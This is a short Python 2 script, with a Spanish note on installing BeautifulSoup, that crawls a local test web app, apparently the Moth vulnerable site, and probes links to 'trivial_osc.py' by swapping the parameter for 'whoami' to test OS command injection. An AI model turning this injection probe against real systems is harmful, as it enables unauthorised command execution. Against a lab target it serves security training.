# -*- encoding: utf-8 -*-
'''
BeautifulSoup para parseo de contenidos.
Nota:
La última versión de BeautifulSoup es la 4.x, la cual no tiene compatibilidad hacia atras con BeautifulSoup 3.x. Es necesario instalarla manualmente o si se utilizan herramientas como pip/easy_install, se debe especificar como nombre de paquete "beautifulsoup4", ya que el nombre "beautifulsoup" se encuentra ligado a la versión 3.x
'''

import requests
from bs4 import BeautifulSoup

mothSite = "http://127.0.0.1:8080/"
response = requests.get(mothSite)
bs = BeautifulSoup(response.text, 'lxml')
links = bs.find_all("a")

def trivialOsc(subLink):
    trivialLink = subLink.split("=")[0]
    trivialLink= trivialLink+"=whoami"
    response = requests.get(mothSite+"/audit/"+trivialLink)
    print mothSite+"/audit/"+trivialLink
    bs = BeautifulSoup(response.text, 'lxml')
    output = bs.find_all("div", { "class" : "output" })
    print output

for link in links:
    if hasattr(link, 'href'):
        if 'http' in link['href'] or 'https' in link['href'] :
            #Ignoring external link
            continue
        print "Link: "+link['href']
        response = requests.get(mothSite+link['href'])
        bs = BeautifulSoup(response.text, 'lxml')
        sublinks = bs.find_all("a")
        for sublink in sublinks:
            print "SubLink "+ sublink['href']
            if 'trivial_osc.py' in sublink['href']:
                trivialOsc(sublink['href'])
